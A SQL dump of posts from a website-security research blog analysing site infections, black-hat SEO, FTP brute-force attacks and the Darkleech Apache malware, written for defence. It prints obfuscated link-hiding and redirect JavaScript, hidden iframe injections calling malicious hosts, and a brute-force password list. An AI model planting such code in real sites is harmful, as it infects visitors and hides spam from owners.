.gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (27, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (28, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (29, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (30, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (31, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (32, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (33, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also 